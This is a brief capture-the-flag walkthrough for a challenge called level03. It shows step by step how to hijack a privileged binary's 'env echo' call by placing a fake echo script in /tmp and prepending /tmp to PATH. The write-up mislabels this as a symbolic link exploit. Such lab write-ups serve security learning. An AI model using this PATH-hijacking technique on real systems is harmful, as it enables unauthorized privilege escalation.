<- strings level03
-> ...
-> /usr/bin/env echo Exploit me
-> ...

so level03 use of a syscall of the function at this path. We can use a case of symbolic link exploit.
So we'll replace the echo call by getflag.

We wrote the wanted call
<- echo "/bin/getflag" > /tmp/echo
<- chmod 777 /tmp/echo

We add the path to our "echo"
<- export PATH=/tmp:$PATH

Then by the call of echo, it launch the what's in the file's path:

<- ./level03
